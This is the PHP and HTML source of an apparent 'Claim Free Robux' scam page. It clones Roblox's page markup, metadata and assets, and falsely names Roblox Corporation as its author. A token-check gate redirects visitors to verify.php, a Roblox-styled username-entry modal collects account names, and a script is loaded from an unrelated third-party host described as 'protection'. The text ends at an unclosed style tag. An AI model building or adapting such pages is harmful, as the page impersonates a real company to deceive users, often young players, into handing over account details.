<?php
session_start();

if (isset($_GET['gToken']) && $_GET['gToken'] === 'verified') {
    if (isset($_POST['sessionToken']) && $_POST['sessionToken'] === 'well') {
        unset($_SESSION['secToken']);
        
    } else {
        header("Location: verify.php");
        exit;
    }
} else {
    header("Location: verify.php");
    exit;
}
?>
<html lang="en" data-arp="">
<head>
<script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script>
<script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>
<script gcode-dev="" src="https://file.g-code.co.id/npm/protection@2.0/"></script>    
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">    
<style type="text/css">

        [uib-tooltip-popup].tooltip.top-left >
 .tooltip-arrow,[uib-tooltip-popup].tooltip.top-right >
 .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-left >
 .tooltip-arrow,[uib-tooltip-popup].tooltip.bottom-right >
 .tooltip-arrow,[uib-tooltip-popup].tooltip.left-top >
 .tooltip-arrow,[uib-tooltip-popup].tooltip.left-bottom >
 .tooltip-arrow,[uib-tooltip-popup].tooltip.right-top >
 .tooltip-arrow,[uib-tooltip-popup].tooltip.right-bottom >
 .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-left >
 .tooltip-arrow,[uib-tooltip-html-popup].tooltip.top-right >
 .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-left >
 .tooltip-arrow,[uib-tooltip-html-popup].tooltip.bottom-right >
 .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-top >
 .tooltip-arrow,[uib-tooltip-html-popup].tooltip.left-bottom >
 .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-top >
 .tooltip-arrow,[uib-tooltip-html-popup].tooltip.right-bottom >
 .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-left >
 .tooltip-arrow,[uib-tooltip-template-popup].tooltip.top-right >
 .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-left >
 .tooltip-arrow,[uib-tooltip-template-popup].tooltip.bottom-right >
 .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-top >
 .tooltip-arrow,[uib-tooltip-template-popup].tooltip.left-bottom >
 .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-top >
 .tooltip-arrow,[uib-tooltip-template-popup].tooltip.right-bottom >
 .tooltip-arrow,[uib-popover-popup].popover.top-left >
 .arrow,[uib-popover-popup].popover.top-right >
 .arrow,[uib-popover-popup].popover.bottom-left >
 .arrow,[uib-popover-popup].popover.bottom-right >
 .arrow,[uib-popover-popup].popover.left-top >
 .arrow,[uib-popover-popup].popover.left-bottom >
 .arrow,[uib-popover-popup].popover.right-top >
 .arrow,[uib-popover-popup].popover.right-bottom >
 .arrow,[uib-popover-html-popup].popover.top-left >
 .arrow,[uib-popover-html-popup].popover.top-right >
 .arrow,[uib-popover-html-popup].popover.bottom-left >
 .arrow,[uib-popover-html-popup].popover.bottom-right >
 .arrow,[uib-popover-html-popup].popover.left-top >
 .arrow,[uib-popover-html-popup].popover.left-bottom >
 .arrow,[uib-popover-html-popup].popover.right-top >
 .arrow,[uib-popover-html-popup].popover.right-bottom >
 .arrow,[uib-popover-template-popup].popover.top-left >
 .arrow,[uib-popover-template-popup].popover.top-right >
 .arrow,[uib-popover-template-popup].popover.bottom-left >
 .arrow,[uib-popover-template-popup].popover.bottom-right >
 .arrow,[uib-popover-template-popup].popover.left-top >
 .arrow,[uib-popover-template-popup].popover.left-bottom >
 .arrow,[uib-popover-template-popup].popover.right-top >
 .arrow,[uib-popover-template-popup].popover.right-bottom >
 .arrow{top:auto;bottom:auto;left:auto;right:auto;margin:0;}[uib-popover-popup].popover,[uib-popover-html-popup].popover,[uib-popover-template-popup].popover{display:block !important;}
    
</style>

    
<style type="text/css">

        .uib-position-measure{display:block !important;visibility:hidden !important;position:absolute !important;top:-9999px !important;left:-9999px !important;}.uib-position-scrollbar-measure{position:absolute !important;top:-9999px !important;width:50px !important;height:50px !important;overflow:scroll !important;}.uib-position-body-scrollbar-measure{overflow:scroll !important;}
    
</style>

    
<style type="text/css">

        .ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}
    
</style>

    
<style>

#gcodeUsernameModal {
    display: none;
    position: fixed;
    top: 30%;
    left: 0;
    width: 100%
    height: 100%
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 1000;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
    box-sizing: border-box;
}

.modal-content-roblox {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 30px;
    width: 100%
    max-width: 400px;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
    text-align: center;
    color: #f0f0f0;
    font-family: 'Source Sans Pro', Arial, sans-serif;
}

.modal-title {
    font-size: 28px;
    font-weight: 700;
    color: #ffffff;
    margin-bottom: 25px;
    text-transform: uppercase;
}

.roblox-input-field {
    width: calc(100% - 20px);
    padding: 12px 10px;
    margin-bottom: 20px;
    border: 1px solid #4a4a4a;
    border-radius: 5px;
    background-color: #383838;
    color: #ffffff;
    font-size: 16px;
    box-sizing: border-box;
    outline: none;
    transition: border-color 0.2s ease-in-out;
}

.roblox-input-field::placeholder {
    color: #b0b0b0;
}

.roblox-input-field:focus {
    border-color: #007bff;
}

.roblox-button {
    background-color: #007bff;
    color: #ffffff;
    padding: 12px 25px;
    border: none;
    border-radius: 5px;
    font-size: 18px;
    font-weight: 700;
    cursor: pointer;
    transition: background-color 0.2s ease-in-out, transform 0.1s ease-in-out;
    width: 100%
    box-sizing: border-box;
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
}

#loadingSpinner {
    margin: 0;
    font-size: 1.2em;
}

.roblox-button:hover {
    background-color: #0056b3;
}

.roblox-button:active {
    transform: translateY(1px);
}

#validationMessage,
#welcomeMessage {
    font-size: 14px;
    font-weight: 600;
    margin-top: 15px;
    line-height: 1.4;
}

#welcomeMessage {
    display: none;
}

@media (max-width: 500px) {
    .modal-content-roblox {
        padding: 20px;
        margin: 10px;
    }
    .modal-title {
        font-size: 24px;
    }
    .roblox-button {
        padding: 10px 20px;
        font-size: 16px;
    }
}
        @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}
    
</style>    
<style type="text/css">

        @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}
    
</style>    
<title>( ✦ ) Claim Free Robux</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">    
<meta name="author" content="Roblox Corporation">
<meta name="description" content="Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.">    
<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">    
<meta name="apple-itunes-app" content="app-id=431946152">    
<link rel="apple-touch-icon" href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png">    
<script type="application/ld json">

        { "@context" : "https://schema.org", "@type" : "Organization", "name" : "Roblox", "url" : "https://www.roblox.com/", "image" : "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png", "logo" : "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png",
        "email" : "info@roblox.com", "sameAs" : [ "https://www.facebook.com/roblox/", "https://twitter.com/roblox", "https://www.linkedin.com/company/147977", "https://www.instagram.com/roblox/", "https://www.youtube.com/user/roblox", "https://www.twitch.tv/roblox"
        ] }
    
</script>    
<meta ng-csp="no-unsafe-eval">    
<meta name="locale-data" data-language-code="en_us" data-language-name="English" data-url-locale="" data-override-language-header="false">    
<meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown" data-is-chrome-os="false" data-is-pcgdk-app="false">    
<meta name="environment-meta" data-domain="roblox.com" data-is-testing-site="false">    
<meta id="roblox-display-names" data-enabled="true">    
<meta name="hardware-backed-authentication-data" data-is-secure-authentication-intent-enabled="true" data-is-bound-auth-token-enabled="true" data-bound-auth-token-whitelist="{"Whitelist":[{"apiSite":"auth.roblox.com","sampleRate":"100"},{"apiSite":"accountsettings.roblox.com","sampleRate":"100"},{"apiSite":"inventory.roblox.com","sampleRate":"100"},{"apiSite":"accountinformation.roblox.com","sampleRate":"100"}, {"apiSite":"billing.roblox.com","sampleRate":"100"}, {"apiSite":"premiumfeatures.roblox.com","sampleRate":"100"}, {"apiSite":"trades.roblox.com","sampleRate":"100"}, {"apiSite":"groups.roblox.com","sampleRate":"100"}, {"apiSite":"adconfiguration.roblox.com","sampleRate":"100"},  {"apiSite":"ads.roblox.com","sampleRate":"100"}, {"apiSite":"assetdelivery.roblox.com","sampleRate":"100"}, {"apiSite":"avatar.roblox.com","sampleRate":"100"}, {"apiSite":"badges.roblox.com","sampleRate":"100"}, {"apiSite":"catalog.roblox.com","sampleRate":"100"}, {"apiSite":"chat.roblox.com","sampleRate":"100"}, {"apiSite":"chatmoderation.roblox.com","sampleRate":"100"}, {"apiSite":"clientsettings.roblox.com","sampleRate":"100"},  {"apiSite":"contacts.roblox.com","sampleRate":"100"}, {"apiSite":"contentstore.roblox.com","sampleRate":"100"},  {"apiSite":"develop.roblox.com","sampleRate":"100"}, {"apiSite":"economy.roblox.com","sampleRate":"100"},  {"apiSite":"engagementpayouts.roblox.com","sampleRate":"100"}, {"apiSite":"followings.roblox.com","sampleRate":"100"},  {"apiSite":"friends.roblox.com","sampleRate":"100"}, {"apiSite":"gameinternationalization.roblox.com","sampleRate":"100"}, {"apiSite":"gamejoin.roblox.com","sampleRate":"100"}, {"apiSite":"gamepersistence.roblox.com","sampleRate":"100"}, {"apiSite":"games.roblox.com","sampleRate":"100"}, {"apiSite":"groupsmoderation.roblox.com","sampleRate":"100"},{"apiSite":"itemconfiguration.roblox.com","sampleRate":"100"}, {"apiSite":"locale.roblox.com","sampleRate":"100"}, {"apiSite":"localizationtables.roblox.com","sampleRate":"100"},  {"apiSite":"metrics.roblox.com","sampleRate":"100"}, {"apiSite":"moderation.roblox.com","sampleRate":"100"},  {"apiSite":"notifications.roblox.com","sampleRate":"100"}, {"apiSite":"points.roblox.com","sampleRate":"100"}, {"apiSite":"presence.roblox.com","sampleRate":"100"}, {"apiSite":"publish.roblox.com","sampleRate":"100"},  {"apiSite":"privatemessages.roblox.com","sampleRate":"100"}, {"apiSite":"thumbnailsresizer.roblox.com","sampleRate":"100"}, {"apiSite":"thumbnails.roblox.com","sampleRate":"100"}, {"apiSite":"translationroles.roblox.com","sampleRate":"100"},  {"apiSite":"translations.roblox.com","sampleRate":"100"}, {"apiSite":"twostepverification.roblox.com","sampleRate":"100"},  {"apiSite":"usermoderation.roblox.com","sampleRate":"100"}, {"apiSite":"users.roblox.com","sampleRate":"100"}, {"apiSite":"voice.roblox.com","sampleRate":"100"}, {"apiSite":"realtimenotifications.roblox.com","sampleRate":"100"}, {"apiSite":"jQuery","sampleRate":"1000000"}]}" data-bound-auth-token-exemptlist="{"Exemptlist":[]}" data-hba-indexed-db-name="hbaDB" data-hba-indexed-db-obj-store-name="hbaObjectStore" data-hba-indexed-db-key-name="hba_keys" data-hba-indexed-db-version="1" data-bat-event-sample-rate="500">    
<meta name="account-switching-data" data-is-account-switching-enabled="true">
<meta name="passkey-data" data-is-passkey-login-enabled="true">    
<meta name="passkey-data-android" data-is-passkey-login-enabled-android="true">  
<meta name="page-guac-migration" data-v1-path="/universal-app-configuration/v1/behaviors/<behaviour-name>/content" data-v2-path="/guac-v2/v1/bundles/<behaviour-name>" data-behavior-page-heartbeat-v2="true" data-behavior-app-policy="true">    
<meta name="page-meta" data-internal-page-name="PremiumRobux">    
<meta name="page-retry-header-enabled" data-retry-attempt-header-enabled="True">
<script type="text/javascript">

        var Roblox = Roblox || {};
    
        Roblox.BundleVerifierConstants = {
            isMetricsApiEnabled: true,
            eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
            deviceType: "Computer",
            cdnLoggingEnabled: JSON.parse("true")
        };
    
</script>    
<script src="/js/utilities/bundleVerifier.js?v=2f89a5fa99eb4cb3591ea59b884e458d" type="text/javascript"></script>
<link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="FoundationCss" data-bundle-source="Main" href="https://css.rbxcdn.com/ce14cebe54df514fc1d310cd5f9f8db939bbd2045abe6889dfa0edd017cc37ce.css"> 
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/fd96125f67edabf301d44c9868ab5abbbfa4004ac4465c2e58635cb5912362d6.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Builder" data-bundle-source="Main" href="https://css.rbxcdn.com/7fc67d38cfc34042bc251805f872ff5be8cb502859e943e5dda46fc3907375c6.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/28d3da7c913edb3c5dfb82f72058178c9ba2c6fb9876b08d73677160922ab903.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main" href="https://css.rbxcdn.com/66b2fd496e668938e3b0e2d9a0c12f9f88c3a1a4974608f69059d8061fc0141f.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/1cc064c3c34a7184cba28e287377ed32d78de1d0eaea8b6a2d10e60f2f267720.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/f77e16b9fa5823882aaa0cdabade9706b9ba2b7e050d23d2831da138a58e5f7f.css">  
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css"> 
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSwitcher" data-bundle-source="Main" href="https://css.rbxcdn.com/49fff8dad77e5262087267ee2e8fda1607525506c4a1ca20af60f9757684e980.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="PriceTag" data-bundle-source="Main" href="https://css.rbxcdn.com/9bfc48ea40a698035ea8cbe3d3e94bd06d3aac48969bedceb6d8ba5ff17ff84d.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="SearchLandingPage" data-bundle-source="Main" href="https://css.rbxcdn.com/df9a376522ff4c39e6d789e6bcc3d4b2817bdac228020ee6fb4990807031f319.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/7528c69882f7b65fad9869daf18dbc4e260c337c657d0d9c012fc315eb0ad2b8.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/7e348738266e9ea2bae9314a2d26b33618c6f4cf3c527b11023620d973c6e7fc.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/945686c706d827658e2e4dee3009559078256e204bb42a3f02fdc6c9552cc7f7.css">


    
<link rel="canonical" href="https://www.roblox.com/upgrades/robux?ctx=navpopover">



    
<link rel="alternate" href="https://www.roblox.com/upgrades/robux?ctx=navpopover" hreflang="x-default">

    
<link rel="alternate" href="https://www.roblox.com/upgrades/robux?ctx=navpopover" hreflang="en">

    
<link rel="alternate" href="https://www.roblox.com/de/upgrades/robux?ctx=navpopover" hreflang="de">

    
<link rel="alternate" href="https://www.roblox.com/es/upgrades/robux?ctx=navpopover" hreflang="es">

    
<link rel="alternate" href="https://www.roblox.com/fr/upgrades/robux?ctx=navpopover" hreflang="fr">

    
<link rel="alternate" href="https://www.roblox.com/id/upgrades/robux?ctx=navpopover" hreflang="id">

    
<link rel="alternate" href="https://www.roblox.com/it/upgrades/robux?ctx=navpopover" hreflang="it">

    
<link rel="alternate" href="https://www.roblox.com/ja/upgrades/robux?ctx=navpopover" hreflang="ja">

    
<link rel="alternate" href="https://www.roblox.com/ko/upgrades/robux?ctx=navpopover" hreflang="ko">

    
<link rel="alternate" href="https://www.roblox.com/pl/upgrades/robux?ctx=navpopover" hreflang="pl">

    
<link rel="alternate" href="https://www.roblox.com/pt/upgrades/robux?ctx=navpopover" hreflang="pt">

    
<link rel="alternate" href="https://www.roblox.com/th/upgrades/robux?ctx=navpopover" hreflang="th">

    
<link rel="alternate" href="https://www.roblox.com/tr/upgrades/robux?ctx=navpopover" hreflang="tr">

    
<link rel="alternate" href="https://www.roblox.com/vi/upgrades/robux?ctx=navpopover" hreflang="vi">

    
<link rel="alternate" href="https://www.roblox.com/ar/upgrades/robux?ctx=navpopover" hreflang="ar">



    
<link onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___fb0c7d1e28371fc5e8367ce241b98d69_m.css/fetch">





    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSecurityPrompt" data-bundle-source="Main" href="https://css.rbxcdn.com/5976c285998b2c199dd3360cc775f9e3f4dc9c5ff23736763623db3794079c86.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccessManagementUpsellV2" data-bundle-source="Main" href="https://css.rbxcdn.com/d777254408347583551beea274411ceed572e3b23f4b31a2fbf3044bbc672897.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="PremiumDisclosures" data-bundle-source="Main" href="https://css.rbxcdn.com/69059229ad91e12f5d900346724308712f2610faa712db13376a4ae76404bbd9.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxUpsellReactPage" data-bundle-source="Main" href="https://css.rbxcdn.com/9a5523db77d3ab5acfeebb66c37f848ad97a060c3de1a025a8038ae7751639ec.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Robux" data-bundle-source="Main" href="https://css.rbxcdn.com/aa3f7d1bfceb663bbde983f6d2633d8032a7fd151ce1c69530c1f0c14f579e5a.css">


    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/7dfc7837b5da6850e13413c630b37da7e88aeb610ca2c7d4e8b71b02cbdc6ba6.css">



    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchaseUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3c4bd9b17b9020d9ebc87d4542a68a949a9de6150a55a92f0e65514520ee777e.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchase" data-bundle-source="Main" href="https://css.rbxcdn.com/1b6cc6d0699561a61e37bae3b8fa07ac5698c5c41c8375ac4f907e189be90232.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="IdVerification" data-bundle-source="Main" href="https://css.rbxcdn.com/3bca47a98d58fdf98a7063c4f3b390671e5326ed559813887f3945876c997da6.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccessManagementUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/d45e200658a1343116bbf4a88c367d093758085e7d001918d641c85b2143468f.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="GameLaunch" data-bundle-source="Main" href="https://css.rbxcdn.com/c5373f0dced8d7be7bb3ad1b978fb8af776157fcc41ad3d5c92d725063c2e6e1.css">





    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="NotificationStream" data-bundle-source="Main" href="https://css.rbxcdn.com/be51f1e43183932246cf3661969ce86d4083076ddb177d1e330da3d0e69d8508.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="SendrNotificationStream" data-bundle-source="Main" href="https://css.rbxcdn.com/29f41e4bf6c725e2fc9a9f7fbccd6d0d1b41b0cca27db769041e9f95d037fa6a.css">

    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Chat" data-bundle-source="Main" href="https://css.rbxcdn.com/ac0aaa05f00c416ebddf3fc95dc38b211e9f03f2300dc8b30e88200bb89356d0.css">




    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" href="https://css.rbxcdn.com/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css">





    
<script type="text/javascript">

        var Roblox = Roblox || {};
        Roblox.RealTimeSettings = Roblox.RealTimeSettings ||
            {
                NotificationsEndpoint: "https://realtime-signalr.roblox.com/userhub",
                NotificationsClientType: "CoreSignalR",
                MaxConnectionTime: "21600000",
                IsEventPublishingEnabled: false,
                IsDisconnectOnSlowConnectionDisabled: true,
                IsSignalRClientTransportRestrictionEnabled: true,
                IsLocalStorageInRealTimeEnabled: true,
                IsDebuggerEnabled: "False",
                IsRealtimeWebAnalyticsEnabled: true,
                IsRealtimeWebAnalyticsConnectionEventsEnabled: false
            }
    
</script>

    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="EnvironmentUrls" data-bundle-source="Main" src="https://js.rbxcdn.com/fc5032e013a877ae8dfdaf16e906375fc2d37781f22ca2908ee39b163d5e6269.js">

</script>




    
<script type="text/javascript">

        var Roblox = Roblox || {};
        Roblox.GaEventSettings = {
            gaDFPPreRollEnabled: "false" === "true",
            gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
            gaPerformanceEventEnabled: "false" === "true"
        };
    
</script>



    
<script onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="headerinit" type="text/javascript" src="https://js.rbxcdn.com/6f8bcfd33c17e884e38a8dcb89b5da42.js">

</script>


    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main" src="https://js.rbxcdn.com/5c8a2ba3737908f693394045e81ebd71c77cde6f87550ea51f7833e8c98200ae.js">

</script>



    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main" src="https://js.rbxcdn.com/2f0fd0c2760ff1898187af6df3b764f4b08f77a315d0a33654f105f61b0ea6d0.js">

</script>



    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main" src="https://js.rbxcdn.com/dd0d34c6d7afd472e5636ca7645e703dd18502fc01c8211279879f64c847dee4.js">

</script>



    
<meta name="roblox-tracer-meta-data" data-access-token="" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com" data-sample-rate="0" data-is-instrument-page-performance-enabled="false">

    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/f85ce090699c1c3962762b8a2f8b252f0f2a7d0424c146f41d6c5abbf0147a57.js">

</script>


    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CrossTabCommunication" data-bundle-source="Main" src="https://js.rbxcdn.com/bfb3e7a7efed2f8ba4d12dc9fdb70dce1ff97ee13e988833a8638cf3ed8fd7f8.js">

</script>

    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RealTime" data-bundle-source="Main" src="https://js.rbxcdn.com/b8666f7b748d2e65853ab9aa98f33598b1a89a699e97783ddbf76809002a99f1.js">

</script>


    
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">




    
<script>

        //Set if it browser's do not track flag is enabled
        var Roblox = Roblox || {};
        (function() {
            var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
            if (typeof window.external !== "undefined" &&
                typeof window.external.msTrackingProtectionEnabled !== "undefined") {
                dnt = dnt || window.external.msTrackingProtectionEnabled();
            }
            Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
        })();
    
</script>


    
<script type="text/javascript">

        var _gaq = _gaq || [];

                window.GoogleAnalyticsDisableRoblox2 = true;
        _gaq.push(['b._setAccount', 'UA-486632-1']);
            _gaq.push(['b._setSampleRate', '5']);
        _gaq.push(['b._setCampSourceKey', 'rbx_source']);
        _gaq.push(['b._setCampMediumKey', 'rbx_medium']);
        _gaq.push(['b._setCampContentKey', 'rbx_campaign']);

            _gaq.push(['b._setDomainName', 'roblox.com']);

            _gaq.push(['b._setCustomVar', 1, 'Visitor', 'Member', 2]);
                _gaq.push(['b._setPageGroup', 1, 'PremiumRobux']);
            _gaq.push(['b._trackPageview']);

        _gaq.push(['c._setAccount', 'UA-26810151-2']);
            _gaq.push(['c._setSampleRate', '1']);
            _gaq.push(['c._setDomainName', 'roblox.com']);
            _gaq.push(['c._setPageGroup', 1, 'PremiumRobux']);

            (function() {
                if (!Roblox.browserDoNotTrack) {
                    var ga = document.createElement('script');
                    ga.type = 'text/javascript';
                    ga.async = true;
                    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www')   '.google-analytics.com/ga.js';
                    var s = document.getElementsByTagName('script')[0];
                    s.parentNode.insertBefore(ga, s);
                }
        })();
    
</script>


    
<script type="text/javascript">

        if (Roblox && Roblox.EventStream) {
                Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/pe?t=studio",
                    "//ecsv2.roblox.com/pe?t=diagnostic");
            }
    
</script>




    
<script type="text/javascript">

        if (Roblox && Roblox.PageHeartbeatEvent) {
            Roblox.PageHeartbeatEvent.Init([2,8,20,60]);
        }
    
</script>

    
<script>

        Roblox = Roblox || {};
        Roblox.AbuseReportPVMeta = {
            desktopEnabled: true,
            phoneEnabled: false,
            inAppEnabled: false
        };
    
</script>



    
<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="4" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">



    
<style type="text/css">

